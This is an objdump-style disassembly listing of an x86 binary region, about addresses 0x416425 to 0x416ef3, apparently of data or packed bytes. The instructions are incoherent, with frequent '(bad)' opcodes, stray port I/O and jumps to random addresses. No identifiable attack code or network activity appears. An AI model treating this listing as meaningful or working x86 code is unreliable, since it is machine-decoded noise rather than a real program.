  416425:	in     al,0x68
  416427:	sbb    al,0x5b
  416429:	out    0x3,eax
  41642b:	retf   
  41642c:	dec    ebp
  41642d:	mov    bl,0x1c
  41642f:	cmp    DWORD PTR [eax-0x5a],ebp
  416432:	and    eax,0x3b429ba6
  416437:	fstp   QWORD PTR [esi-0x19]
  41643a:	into   
  41643b:	xchg   esi,eax
  41643c:	mov    dh,0x37
  41643e:	int3   
  41643f:	cmp    ebp,DWORD PTR [ebx]
  416441:	add    ah,0x9b
  416444:	iret   
  416445:	stc    
  416446:	add    bl,BYTE PTR [edi-0x39]
  416449:	add    BYTE PTR [esi+0x0],dh
	...
  416474:	mov    ebx,0x1738e85f
  416479:	enter  0xd3fd,0x77
  41647d:	aas    
  41647e:	xor    al,0xb1
  416480:	pop    esi
  416481:	(bad)  
  416482:	(bad)  
  416483:	fsub   QWORD PTR [edi-0x41]
  416486:	std    
  416487:	repnz cmp cl,cl
  41648a:	push   0xfffffff1
  41648c:	mov    bh,0x2e
  41648e:	dec    eax
  41648f:	test   al,0x1f
  416491:	enter  0xe173,0x27
  416495:	mov    eax,0xc8f92e19
  41649a:	jae    0x41648d
  41649c:	pop    ss
  41649d:	or     eax,0xff91efc
  4164a2:	add    cl,ch
  4164a4:	pop    ds
  4164a5:	pop    ebx
  4164a6:	(bad)  
  4164a7:	sub    ebx,DWORD PTR [ebx+ebx*2]
  4164aa:	push   ebx
  4164ab:	jb     0x4164e1
  4164ad:	fld    st(4)
  4164af:	add    eax,ebp
  4164b1:	cs push 0x863750
  4164b7:	icebp  
  4164b8:	int    0x5b
  4164ba:	shl    esi,0x40
  4164bd:	dec    edi
  4164be:	or     al,0xde
  4164c0:	ret    0xe85e
  4164c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c4:	and    al,dh
  4164c6:	std    
  4164c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c8:	mov    ds:0x1fe8ffc2,al
  4164cd:	pop    ebx
  4164ce:	mov    esp,DWORD PTR [eax+eax*1]
  4164d1:	push   ss
  4164d2:	push   0x1b8c90
  4164d7:	rol    DWORD PTR [eax],0x0
	...
  4164fe:	add    BYTE PTR [eax],al
  416500:	add    BYTE PTR [edx+0x72],al
  416503:	std    
  416504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416505:	mov    ah,0x6
  416507:	jne    0x4164d4
  416509:	iret   
  41650a:	fnstcw WORD PTR [ebx-0x6f]
  41650d:	(bad)  
  41650f:	push   ss
  416510:	add    ecx,DWORD PTR [eax]
  416512:	sub    edi,ebp
  416514:	add    BYTE PTR [eax+0x7238e5ce],bl
  41651a:	jg     0x41651a
  41651c:	or     esi,DWORD PTR [ebp+0x38c706f6]
  416522:	jae    0x416521
  416524:	inc    DWORD PTR [ebp+0x73c1e85a]
  41652a:	jg     0x41652a
  41652c:	mov    edi,DWORD PTR [eax+0x7dc2c87e]
  416532:	pop    edx
  416533:	push   ebx
  416534:	mov    esi,ecx
  416536:	stos   BYTE PTR es:[edi],al
  416537:	dec    ebp
  416538:	pop    eax
  416539:	ins    DWORD PTR es:[edi],dx
  41653a:	js     0x416534
  41653c:	inc    eax
  41653d:	xor    eax,0xf6016f72
  416542:	jle    0x41656e
  416544:	fild   DWORD PTR [edx]
  416546:	cmc    
  416547:	add    eax,0xfe7f84e8
  41654c:	(bad)  
  41654d:	sbb    cl,BYTE PTR ds:[esi]
  416550:	test   BYTE PTR [ebx+0x22000059],ch
  416556:	cmc    
  416557:	add    eax,0xfd57a1e8
  41655c:	(bad)  
  41655d:	(bad)  
  41655e:	sbb    DWORD PTR [ebp+eax*1+0x1c],esi
  416562:	inc    esp
  416563:	std    
  416564:	inc    DWORD PTR [eax]
	...
  41658e:	add    eax,0xd20c7479
  416593:	jecxz  0x41659a
  416595:	call   0x3fdff0
  41659a:	shl    bl,cl
  41659c:	add    eax,0xfd5c74e8
  4165a1:	dec    esi
  4165a3:	sbb    DWORD PTR [edx+eax*1-0x22],esi
  4165a7:	out    dx,eax
  4165a8:	(bad)  
  4165a9:	jne    0x416568
  4165ab:	jno    0x4165cf
  4165ad:	sbb    al,0x82
  4165af:	jns    0x4165bb
  4165b1:	ror    BYTE PTR [eax],0x5d
  4165b4:	jmp    0x982e821c
  4165b9:	pop    es
  4165ba:	mov    ah,0x68
  4165bc:	add    bh,bh
  4165be:	fwait
  4165bf:	enter  0x7441,0x1e
  4165c3:	jmp    0x7533cd7f
  4165c8:	ret    
  4165c9:	inc    DWORD PTR [edx-0x4f17f632]
  4165cf:	pop    esp
  4165d0:	and    esi,edi
  4165d2:	daa    
  4165d3:	je     0x41656c
  4165d5:	add    DWORD PTR [edi-0xf],esi
  4165d8:	and    dh,BYTE PTR [esp+edx*1+0x1c]
  4165dc:	sbb    BYTE PTR [edx],bl
  4165de:	pop    ebx
  4165df:	sbb    al,0xd
  4165e1:	ror    cl,0xb1
  4165e4:	xor    ecx,DWORD PTR cs:[ebx+0x6]
  4165e8:	or     ch,al
  4165ea:	rcl    BYTE PTR [edi+0x7427fe22],1
  4165f0:	xchg   edi,eax
  4165f1:	add    DWORD PTR [eax],eax
	...
  41661b:	inc    edi
  41661c:	popf   
  41661d:	and    dh,BYTE PTR [esp+edx*1+0x5c]
  416621:	sbb    DWORD PTR [ebx+eiz*1],edx
  416624:	push   esp
  416625:	test   edi,esi
  416627:	cmp    al,0x45
  416629:	add    ebp,DWORD PTR [ebx]
  41662b:	fmul   st(1),st
  41662d:	inc    ecx
  41662e:	jae    0x41665f
  416630:	lar    eax,WORD PTR [eax]
  416633:	sub    al,0xb2
  416635:	xchg   esi,eax
  416636:	or     esi,DWORD PTR [edi+0x1c0001b3]
  41663c:	test   eax,0xb21fbb08
  416641:	add    DWORD PTR [eax],eax
  416643:	xchg   edi,eax
  416644:	icebp  
  416645:	mov    esi,0x1cadec8
  41664a:	push   ebp
  41664b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41664c:	xchg   esi,eax
  41664d:	mov    cl,0x57
  41664f:	xor    al,0x4b
  416651:	sbb    edi,DWORD PTR [edi]
  416653:	sbb    al,0xa
  416655:	xchg   esp,eax
  416656:	add    bh,bl
  416658:	pop    ebx
  416659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665a:	and    ch,BYTE PTR [eax]
  41665c:	push   edi
  41665d:	sahf   
  41665e:	cwde   
  41665f:	and    esi,DWORD PTR [ebx-0x3b5ddd37]
  416665:	loop   0x4166aa
  416667:	adc    BYTE PTR [ecx-0x7a],ah
  41666a:	cwde   
  41666b:	daa    
  41666c:	(bad)  
  41666d:	hlt    
  41666e:	or     esi,DWORD PTR [eax+ebp*2+0x76]
  416672:	and    al,BYTE PTR [edx+0x2698a750]
  416678:	(bad)  
  416679:	fmul   QWORD PTR [edi]
  41667b:	jae    0x4166cb
  41667d:	out    dx,eax
  41667e:	sub    eax,DWORD PTR [eax]
	...
  4166a8:	pop    ds
  4166a9:	les    edx,FWORD PTR [esi+0x22]
  4166ac:	push   esp
  4166ad:	cdq    
  4166ae:	fild   WORD PTR [ebx]
  4166b0:	icebp  
  4166b1:	iret   
  4166b2:	push   ebx
  4166b3:	xchg   BYTE PTR [edi-0x41],bl
  4166b6:	call   0x451d:0xbf22dbba
  4166bd:	sbb    esp,edi
  4166bf:	sbb    ebp,DWORD PTR [ebp+0x6222a59]
  4166c5:	mov    al,ds:0xc3dede0f
  4166ca:	push   ss
  4166cb:	dec    edx
  4166cc:	fdiv   DWORD PTR [esi+0x5b1c03e7]
  4166d2:	je     0x41669c
  4166d4:	pop    es
  4166d5:	sub    ecx,DWORD PTR [edi]
  4166d7:	xor    ch,BYTE PTR [edi]
  4166d9:	(bad)  
  4166da:	test   BYTE PTR [ebp-0x67184880],0x13
  4166e1:	(bad)  
  4166e2:	sub    al,0x30
  4166e4:	arpl   WORD PTR [ebx-0x3c150739],si
  4166ea:	push   0xffffff9f
  4166ec:	neg    DWORD PTR [edx+0x54]
  4166ef:	or     ebp,DWORD PTR [ecx-0x444b2ce3]
  4166f5:	test   eax,0xd7ca20d3
  4166fa:	add    BYTE PTR [esp+ecx*1],dh
  4166fd:	les    ecx,FWORD PTR [esi]
  4166ff:	gs mov es,ebx
  416702:	std    
  416703:	jmp    0x3a3185aa
  416708:	std    
  416709:	dec    esi
  41670a:	in     al,dx
  41670b:	add    DWORD PTR [eax],0x0
	...
  416735:	jnp    0x4166fb
  416737:	std    
  416738:	mov    fs,WORD PTR [ecx-0x4d040035]
  41673e:	add    al,0x63
  416740:	es pop edi
  416742:	ret    
  416743:	jmp    0x1fe3:0xe41ed510
  41674a:	pop    ebx
  41674b:	add    BYTE PTR [esi],ch
  41674d:	pop    ebx
  41674e:	mov    ebx,0x5b1fe900
  416753:	mov    ebp,DWORD PTR [edi+esi*1+0xbd4fd14]
  41675a:	sub    eax,0xc459d5e8
  41675f:	std    
  416760:	repnz fild WORD PTR [edi+0x10]
  416764:	push   0xffffffa3
  416766:	mov    ebx,0xc429b500
  41676b:	jae    0x41677e
  41676d:	add    BYTE PTR [ebp-0x5],dh
  416770:	push   ds
  416771:	std    
  416772:	rcr    al,1
  416774:	push   ss
  416775:	mov    edi,DWORD PTR [ebx-0x3deb8918]
  41677b:	std    
  41677c:	repnz push eax
  41677e:	inc    edi
  41677f:	adc    ebp,DWORD PTR [edx-0x55]
  416782:	mov    esi,0xc22c7d00
  416787:	dec    ebx
  416788:	add    eax,0xe911dac8
  41678d:	pop    ds
  41678e:	mov    bl,0xd7
  416790:	icebp  
  416791:	pop    ds
  416792:	pop    ebx
  416793:	jmp    0x459c9836
  416798:	imul   eax,DWORD PTR [eax],0x0
	...
  4167c2:	mov    esp,0xdf0074c2
  4167c7:	xchg   ebx,eax
  4167c8:	jge    0x416809
  4167ca:	mov    ch,0xea
  4167cc:	add    DWORD PTR [ebx],ecx
  4167ce:	scas   al,BYTE PTR es:[edi]
  4167cf:	jmp    0x6a0d:0xea8e0b9b
  4167d6:	mov    ch,0xd1
  4167d8:	inc    esp
  4167d9:	lock in eax,0xee
  4167dc:	fdiv   DWORD PTR [ebx-0xc]
  4167df:	push   esi
  4167e0:	call   0xfebcc442
  4167e5:	call   DWORD PTR [eax+0x7150e572]
  4167eb:	jnp    0x4167eb
  4167ed:	mov    esi,DWORD PTR [esi-0x3936a565]
  4167f3:	or     DWORD PTR [ebx-0x62e5fb14],ecx
  4167f9:	dec    dl
  4167fb:	jp     0x416853
  4167fd:	push   esi
  4167fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ff:	push   es
  416800:	data16 in al,dx
  416802:	out    dx,al
  416803:	popf   
  416804:	std    
  416805:	not    DWORD PTR [edi-0x35003ea3]
  41680b:	cmp    al,BYTE PTR [esi+0x41]
  41680e:	xor    eax,0x5a003ede
  416813:	fcmove st,st(2)
  416815:	add    DWORD PTR [ebp+0x5e],eax
  416818:	mov    eax,DWORD PTR [ebp-0x183ef]
  41681e:	gs add esp,esi
  416821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416822:	jmp    0x0:0xbfe7a
	...
  41684d:	add    BYTE PTR [eax],al
  41684f:	inc    ebp
  416850:	imul   eax,DWORD PTR [esp+eiz*4-0x7cffa20c],0x48
  416858:	push   0xfffffffb
  41685a:	dec    DWORD PTR [edx]
  41685c:	pop    ebp
  41685d:	or     eax,0x587284
  416862:	add    BYTE PTR [eax-0x2c],bh
  416865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416866:	(bad)  
  416867:	sbb    al,0xa9
  416869:	sbb    eax,0x18e6db4f
  41686e:	std    
  41686f:	rcr    DWORD PTR [eax+0x127412c],cl
  416875:	push   ds
  416876:	sub    cl,dl
  416878:	cmp    dl,BYTE PTR [edi-0x5d]
  41687b:	mov    edx,0xebea1df0
  416880:	mov    eax,ds:0x91a0b60e
  416885:	imul   edi,ebp,0x67b4e8a3
  41688b:	cdq    
  41688c:	fs ret 
  41688e:	jmp    DWORD PTR [eax-0x7402bdd2]
  416894:	inc    eax
  416895:	mov    ah,0xe7
  416897:	sti    
  416898:	mov    ebx,0xf79f0001
  41689d:	adc    BYTE PTR [ebp-0x1e18a67],cl
  4168a3:	imul   eax,DWORD PTR [ebx],0x1f
  4168a6:	mov    ah,0xb8
  4168a8:	sub    DWORD PTR ds:0xe45c44fe,ebx
  4168ae:	(bad)  
  4168af:	push   ebx
  4168b0:	dec    edx
  4168b1:	xchg   DWORD PTR [ebx+0x0],esp
	...
  4168db:	add    BYTE PTR [edx-0x80],cl
  4168de:	sbb    eax,0xf4899f45
  4168e3:	jno    0x416945
  4168e5:	jo     0x41693e
  4168e7:	repz xor bh,BYTE PTR [eax+0x1d]
  4168eb:	out    0xf6,eax
  4168ed:	leave  
  4168ee:	push   ds
  4168ef:	(bad)  
  4168f0:	pop    ebx
  4168f1:	cs pop esp
  4168f3:	std    
  4168f4:	sbb    edx,DWORD PTR [edx+0x4]
  4168f7:	add    BYTE PTR [edx+esi*4],bl
  4168fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fb:	add    DWORD PTR [ecx+0x3fd5c37],ebx
  416901:	retf   0xfeb1
  416904:	mov    cl,0xc6
  416906:	sbb    edi,esi
  416908:	repz pop ebx
  41690a:	iret   
  41690b:	(bad)  
  41690c:	xadd   dh,bl
  41690f:	or     bl,ah
  416911:	push   eax
  416912:	imul   ebx,DWORD PTR [ebx],0xffffffdb
  416915:	shl    bh,0x84
  416918:	nop
  416919:	add    eax,esi
  41691b:	push   ds
  41691c:	retf   0x210e
  41691f:	add    al,0x1c
  416921:	push   eax
  416922:	ins    BYTE PTR es:[edi],dx
  416923:	sub    edi,DWORD PTR [ebx-0x676f1840]
  416929:	les    esp,FWORD PTR [ebp+0xf2baa1e]
  41692f:	or     BYTE PTR ds:0x252be75b,bl
  416935:	pop    eax
  416936:	out    0x3,eax
  416938:	daa    
  416939:	fwait
  41693a:	test   BYTE PTR [edi+0x3e75b5a],0x0
	...
  416969:	inc    ecx
  41696a:	push   edi
  41696b:	call   0x66918573
  416970:	inc    edi
  416971:	jae    0x416933
  416973:	out    0x2b,eax
  416975:	(bad)  
  416976:	pop    eax
  416977:	out    0x3,eax
  416979:	int3   
  41697a:	xor    bl,BYTE PTR [ebp-0x6e]
  41697d:	fcomp  QWORD PTR [edx+0x5c]
  416980:	mov    BYTE PTR [ebp-0x3f],bl
  416983:	inc    esi
  416984:	push   ds
  416985:	(bad)  [edx+0x5b1c0631]
  41698b:	push   0x47
  41698d:	daa    
  41698e:	xor    eax,0xc49890e7
  416993:	and    eax,0xf2b2a1e
  416998:	cmp    BYTE PTR [ecx],bl
  41699a:	pop    ebx
  41699b:	out    0x90,eax
  41699d:	mov    al,ds:0x121e0dc3
  4169a2:	sub    ecx,DWORD PTR [edi]
  4169a4:	and    al,BYTE PTR [ecx-0x40]
  4169a7:	dec    BYTE PTR [ecx]
  4169a9:	fadd   QWORD PTR [ebp+0x0]
  4169ac:	leave  
  4169ad:	(bad)  
  4169ae:	dec    BYTE PTR [eax-0x58]
  4169b1:	pop    ds
  4169b2:	into   
  4169b3:	and    edx,0xa
  4169b6:	sar    ebp,0x39
  4169b9:	xor    BYTE PTR [edi+0x1d],bl
  4169bc:	(bad)  
  4169bd:	cmp    edi,ecx
  4169bf:	xchg   ebx,eax
  4169c0:	stos   DWORD PTR es:[edi],eax
  4169c1:	xor    al,cl
  4169c3:	std    
  4169c4:	sbb    edx,DWORD PTR [eax+0x20de64b7]
  4169ca:	shr    ecx,0xda
	...
  4169f5:	add    BYTE PTR [edx+0x11afc2d6],ch
  4169fb:	rcl    DWORD PTR [eax+0x74],0xa3
  4169ff:	(bad)  
  416a00:	(bad)  
  416a01:	sahf   
  416a02:	add    DWORD PTR [eax],edx
  416a04:	call   0xfe02049b
  416a09:	pusha  
  416a0a:	fwait
  416a0b:	add    edi,edi
  416a0d:	xchg   BYTE PTR [ecx],ch
  416a0f:	shl    DWORD PTR [ebx-0x23eddc3],0x76
  416a16:	ror    ebx,cl
  416a18:	(bad)  
  416a19:	outs   dx,BYTE PTR ds:[esi]
  416a1a:	adc    DWORD PTR [eax-0x3ef70010],edi
  416a20:	or     DWORD PTR [ecx],ebp
  416a22:	test   BYTE PTR [eax+ebp*2+0x1ab3eb],cl
  416a29:	inc    ecx
  416a2a:	and    ebx,DWORD PTR [ecx+0x0]
  416a2d:	jmp    0xb543a1c1
  416a32:	pop    esi
  416a33:	mov    edi,0xbdc47cfe
  416a38:	std    
  416a39:	cs add dl,dh
  416a3c:	and    eax,0xff320926
  416a41:	xchg   edx,eax
  416a42:	pop    ds
  416a43:	xor    eax,0x2731600
  416a48:	dec    DWORD PTR [esi]
  416a4a:	xor    DWORD PTR [esi],esi
  416a4c:	fadd   QWORD PTR [eax]
  416a4e:	int    0x99
  416a50:	std    
  416a51:	imul   esi,ebp,0x5076d72
  416a57:	pop    ebx
  416a58:	std    
  416a59:	mov    ch,0x0
	...
  416a83:	inc    ecx
  416a84:	pop    ebp
  416a85:	(bad)  
  416a86:	dec    ebp
  416a88:	pop    ebx
  416a89:	sbb    edi,edi
  416a8b:	ret    0xb45f
  416a8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8f:	repz pop edi
  416a91:	(bad)  
  416a92:	call   0x402f84
  416a97:	loop   0x416abe
  416a99:	icebp  
  416a9a:	inc    BYTE PTR [edx-0x28931aa1]
  416aa0:	pop    edi
  416aa1:	(bad)  
  416aa2:	cld    
  416aa3:	mov    dh,0x1a
  416aa5:	mov    eax,0xfe5f82ff
  416aaa:	repnz push ebx
  416aac:	mov    ds:0xa5080f06,al
  416ab1:	sti    
  416ab2:	jmp    DWORD PTR [edx-0x4936a100]
  416ab8:	add    eax,0x15f6ec8b
  416abd:	in     eax,dx
  416abe:	push   eax
  416abf:	or     eax,0x45fddaef
  416ac4:	push   edi
  416ac5:	clc    
  416ac6:	jb     0x416b3c
  416ac8:	sbb    edi,esi
  416aca:	mov    esp,DWORD PTR [edi]
  416acc:	dec    edx
  416acd:	gs add eax,0xe8005a44
  416ad3:	xor    al,ah
  416ad5:	(bad)  
  416ad6:	jmp    ebp
  416ad8:	ror    bh,cl
  416ada:	nop
  416adb:	int3   
  416adc:	xchg   esp,eax
  416add:	stc    
  416ade:	nop
  416adf:	mov    esi,0x38688d8b
  416ae4:	pop    ecx
	...
  416b0d:	add    BYTE PTR [eax],al
  416b0f:	add    BYTE PTR ds:0x2ff1724,cl
  416b15:	dec    edx
  416b16:	mov    dl,dl
  416b18:	sbb    al,0x3b
  416b1a:	(bad)  
  416b1b:	out    dx,eax
  416b1c:	lods   al,BYTE PTR ds:[esi]
  416b1d:	fild   DWORD PTR [esi]
  416b1f:	add    DWORD PTR [esp+esi*4],ebx
  416b22:	sub    DWORD PTR [eax-0x75e642da],ebp
  416b28:	into   
  416b29:	and    ecx,DWORD PTR [eax+0x19f6a5d1]
  416b2f:	mov    cl,dh
  416b31:	dec    eax
  416b32:	ss (bad) 
  416b34:	je     0x416aee
  416b36:	add    al,0x0
  416b38:	sbb    al,0xa5
  416b3a:	(bad)  
  416b3b:	sti    
  416b3c:	inc    esi
  416b3d:	mov    ah,0x29
  416b3f:	push   ebx
  416b40:	and    dh,BYTE PTR [ecx+eax*1-0x721e6870]
  416b47:	sar    DWORD PTR [ebx+0x1867147e],1
  416b4d:	mov    bl,0x1
  416b4f:	add    BYTE PTR [edi+edi*1-0x36e30001],dh
  416b56:	inc    ecx
  416b57:	jae    0x416b85
  416b59:	cmp    DWORD PTR [esi],esi
  416b5b:	pop    DWORD PTR [edi+eax*8]
  416b5e:	lea    eax,[eax+0x1c]
  416b61:	aad    0x8f
  416b63:	out    dx,eax
  416b64:	je     0x416aef
  416b66:	(bad)  
  416b67:	call   FWORD PTR [ecx+edi*1]
  416b6a:	imul   ebx,DWORD PTR ss:[edx+ebx*2],0xaa1e6a04
  416b72:	add    DWORD PTR [edx+0x0],ebp
	...
  416b9d:	pop    ds
  416b9e:	lods   al,BYTE PTR ds:[esi]
  416b9f:	add    DWORD PTR [eax],eax
  416ba1:	sbb    al,0x74
  416ba3:	sbb    DWORD PTR [esp+ecx*2+0x1b],esi
  416ba7:	lsl    ebx,WORD PTR [esp+esi*4]
  416bab:	mov    WORD PTR [eax+ecx*2-0xd],es
  416baf:	push   cs
  416bb0:	shl    BYTE PTR [ecx+0x30741aef],0x6c
  416bb7:	(bad)  
  416bb8:	out    dx,eax
  416bb9:	xor    al,0x5a
  416bbb:	inc    DWORD PTR [eax]
  416bbd:	sbb    al,0x5b
  416bbf:	xchg   ecx,eax
  416bc0:	mov    bh,0x85
  416bc2:	pop    ebx
  416bc3:	push   ss
  416bc4:	xchg   ecx,eax
  416bc5:	add    esi,DWORD PTR [ecx+edi*2-0xda4e3fe]
  416bcc:	inc    ebx
  416bcd:	(bad)  
  416bce:	dec    edi
  416bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bd0:	stos   DWORD PTR es:[edi],eax
  416bd1:	adc    BYTE PTR [edi-0x58],al
  416bd4:	add    ecx,DWORD PTR [ebx+esi*4-0x15]
  416bd8:	(bad)  
  416bd9:	jmp    0x416b97
  416bdb:	push   ecx
  416bdc:	add    al,0x76
  416bde:	pop    ebx
  416bdf:	push   ecx
  416be0:	push   es
  416be1:	inc    esi
  416be2:	pop    ebx
  416be3:	inc    ecx
  416be4:	pop    es
  416be5:	inc    esp
  416be6:	pop    ebx
  416be7:	out    0x3,eax
  416be9:	fdivr  QWORD PTR [esp+edi*1-0x1c1344ec]
  416bf0:	add    ebx,DWORD PTR [edx+edx*8]
  416bf3:	sub    al,0x10
  416bf5:	repz inc esi
  416bf7:	inc    edx
  416bf8:	lods   al,BYTE PTR ds:[esi]
  416bf9:	or     DWORD PTR [edi+0x28],eax
  416bfc:	add    al,0xb4
  416bfe:	add    al,0xe4
  416c00:	add    eax,DWORD PTR [eax]
	...
  416c2a:	sbb    al,0x2b
  416c2c:	(bad)  
  416c2d:	stc    
  416c2e:	nop    edi
  416c31:	sbb    dl,BYTE PTR [eax]
  416c33:	(bad)  
  416c34:	(bad)  
  416c35:	fsubr  DWORD PTR [eax]
  416c37:	mov    esp,0x467ab37e
  416c3c:	jnp    0x416c69
  416c3e:	(bad)  
  416c3f:	push   edi
  416c40:	out    0x3,eax
  416c42:	les    ecx,FWORD PTR [edi+0x27]
  416c45:	nop
  416c46:	sbb    eax,0xd01aaab0
  416c4b:	mov    esi,0x19cfadbf
  416c50:	out    0x1a,eax
  416c52:	rol    dl,1
  416c54:	dec    edi
  416c55:	dec    eax
  416c56:	sbb    BYTE PTR [ebx-0x19],bl
  416c59:	xchg   BYTE PTR [edi+0x4f],bl
  416c5c:	add    cl,al
  416c5e:	lea    ecx,[eax+0x3f]
  416c61:	jmp    0xe945fe5d
  416c66:	pop    ds
  416c67:	push   eax
  416c68:	rcl    BYTE PTR [ebp-0x62facbff],0xd8
  416c6f:	mov    ebx,0x5860014d
  416c74:	add    cl,ch
  416c76:	adc    bl,BYTE PTR [ebx-0x4436258c]
  416c7c:	addr16 jmp 0xef39b398
  416c82:	fwait
  416c83:	stos   DWORD PTR es:[edi],eax
  416c84:	push   0x1ad0c5
  416c89:	push   ebx
  416c8a:	and    BYTE PTR [eax+edx*8+0xd6],bh
	...
  416cb5:	add    BYTE PTR [eax],al
  416cb7:	mov    ds:0xc751e8bf,eax
  416cbc:	mov    esp,0xab93c6fd
  416cc1:	call   0xfdfe23ff
  416cc6:	mov    dh,0xa3
  416cc8:	ret    
  416cc9:	call   0xfdfe140f
  416cce:	mov    al,0x59
  416cd0:	daa    
  416cd1:	mov    DWORD PTR [ebp+0x3ae097a1],ecx
  416cd7:	enter  0x6823,0x1c
  416cdb:	and    eax,0xaa81007c
  416ce0:	pop    edx
  416ce1:	sar    DWORD PTR [esi-0x5f],0x7e
  416ce5:	ins    DWORD PTR es:[edi],dx
  416ce6:	and    bl,BYTE PTR [edi-0x45]
  416ce9:	std    
  416cea:	cmc    
  416ceb:	push   ss
  416cec:	fdivr  DWORD PTR [ebx]
  416cee:	rcl    BYTE PTR [eax+0x1a],cl
  416cf1:	add    cl,ch
  416cf3:	stos   BYTE PTR es:[edi],al
  416cf4:	push   esi
  416cf5:	sub    DWORD PTR [ecx],ebp
  416cf7:	xchg   ecx,eax
  416cf8:	xchg   edx,eax
  416cf9:	shl    DWORD PTR [esi],0x8b
  416cfc:	mov    edi,0x57350000
  416d01:	add    bh,al
  416d03:	sbb    BYTE PTR [edi-0x3],0xff
  416d07:	inc    ebp
  416d08:	push   edi
  416d09:	lds    eax,FWORD PTR [ebp-0x17]
  416d0c:	push   esi
  416d0d:	add    BYTE PTR [eax],al
  416d0f:	xor    eax,0x5f4441a
  416d14:	pop    edi
  416d15:	add    BYTE PTR [eax],al
  416d17:	inc    edx
  416d18:	cli    
  416d19:	in     eax,dx
	...
  416d42:	add    BYTE PTR [eax],al
  416d44:	cmc    
  416d45:	pop    esi
  416d46:	add    BYTE PTR [ebp-0x72b2b150],cl
  416d4c:	shr    BYTE PTR [edx+0x4d],0x8d
  416d50:	rol    BYTE PTR [edx-0x1e0595b3],0x44
  416d57:	cld    
  416d58:	and    eax,0xc66a0009
  416d5d:	or     dh,bh
  416d5f:	(bad)  
  416d60:	rol    BYTE PTR [ebx],1
  416d62:	dec    ebx
  416d63:	inc    ecx
  416d64:	mov    ch,0xe5
  416d66:	inc    esp
  416d67:	call   0x1273ea2
  416d6c:	icebp  
  416d6d:	gs jg  0x416ded
  416d70:	fisttp QWORD PTR [eax-0x164a0003]
  416d76:	jno    0x416d77
  416d78:	add    BYTE PTR [ebx-0x72],dl
  416d7b:	inc    ebp
  416d7c:	mov    ebp,0x85f87cdf
  416d81:	jmp    0x3fea:0x57388b57
  416d88:	call   0xfec5:0x64e865cf
  416d8f:	(bad)  
  416d90:	cld    
  416d91:	clc    
  416d92:	(bad)  
  416d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d95:	xchg   BYTE PTR [esi],dl
  416d97:	sub    edx,edi
  416d99:	push   edx
  416d9a:	or     al,al
  416d9c:	jno    0x416d5d
  416d9e:	mov    BYTE PTR [ebp+0x1c],al
  416da1:	sub    BYTE PTR [ebx-0x6a6cbf5],ch
  416da7:	inc    BYTE PTR [eax]
	...
  416dd1:	inc    ebx
  416dd2:	and    DWORD PTR [esi+0xa04abdf],ecx
  416dd8:	jmp    FWORD PTR [ecx+0x203f8827]
  416dde:	mov    esi,ecx
  416de0:	shr    BYTE PTR [edi+0x1c8f0202],1
  416de6:	and    eax,0xc45d7232
  416deb:	test   dl,al
  416ded:	nop
  416dee:	imul   eax,esi,0x25de9feb
  416df4:	push   DWORD PTR [eax+0x1d]
  416df7:	sbb    BYTE PTR [eax+esi*8-0x50],dh
  416dfb:	jmp    0x416e67
  416dfd:	push   edi
  416dfe:	add    eax,DWORD PTR [edx]
  416e00:	(bad)  
  416e01:	pop    ecx
  416e02:	rol    BYTE PTR [eax+eax*1],0x1c
  416e06:	les    eax,FWORD PTR [esp+edi*2+0x49dc4]
  416e0d:	sbb    al,0xf
  416e0f:	(bad)  
  416e10:	call   0xfe570f75
  416e15:	lahf   
  416e16:	jbe    0x416e30
  416e18:	jmp    FWORD PTR [edi]
  416e1a:	mov    ebx,0x8a87416
  416e1f:	lock push 0x57
  416e22:	add    DWORD PTR [eax+edi*4],0x1d
  416e26:	les    eax,FWORD PTR [ecx]
  416e28:	add    bh,dh
  416e2a:	cli    
  416e2b:	inc    ecx
  416e2c:	push   esp
  416e2d:	xchg   edi,eax
  416e2e:	aaa    
  416e2f:	add    ebx,0x4fad5468
	...
  416e5d:	add    ah,dl
  416e5f:	dec    ebx
  416e60:	scas   al,BYTE PTR es:[edi]
  416e61:	(bad)  
  416e62:	fadd   st(3),st
  416e64:	sbb    DWORD PTR [ecx+0x1d],esi
  416e67:	add    eax,0x5b218216
  416e6c:	mov    cl,bl
  416e6e:	fcomp  QWORD PTR [edx-0x19]
  416e71:	(bad)  
  416e72:	and    al,0xde
  416e74:	adc    al,0x67
  416e76:	(bad)  
  416e77:	sbb    esp,edi
  416e79:	add    ecx,ecx
  416e7b:	pusha  
  416e7c:	adc    al,BYTE PTR [edx+ebx*8+0x15]
  416e80:	xor    BYTE PTR [ebx-0x5a],al
  416e83:	push   edi
  416e84:	sbb    BYTE PTR [ebx+0x75405adc],dl
  416e8a:	sbb    al,0x5b
  416e8c:	out    0x2b,eax
  416e8e:	scas   al,BYTE PTR es:[edi]
  416e8f:	sbb    BYTE PTR [esi],0x17
  416e92:	sahf   
  416e93:	jbe    0x416ed1
  416e95:	xchg   ebx,eax
  416e96:	pop    esp
  416e97:	pop    ebx
  416e98:	out    0x8f,eax
  416e9a:	sub    bh,BYTE PTR [eax+0x6efaff7a]
  416ea0:	adc    al,0x93
  416ea2:	pop    esp
  416ea3:	pop    ebx
  416ea4:	inc    DWORD PTR [edx+0xae75b1e]
  416eaa:	fsubr  QWORD PTR [esi]
  416eac:	in     al,dx
  416ead:	sub    al,0x45
  416eaf:	pop    edx
  416eb0:	out    0x3,eax
  416eb2:	fistp  DWORD PTR [esi]
  416eb4:	rol    DWORD PTR [ebx],cl
  416eb6:	sbb    al,0x5b
  416eb8:	out    0x88,eax
  416eba:	pop    eax
  416ebb:	mov    bh,0x17
  416ebd:	stos   BYTE PTR es:[edi],al
  416ebe:	mov    ebx,0x16e942
	...
  416eeb:	cs pop edi
  416eed:	inc    ecx
  416eee:	add    al,0xab
  416ef0:	sub    al,0xe3
  416ef2:	push   ss
  416ef3:	or     BYTE PTR [eax],cl
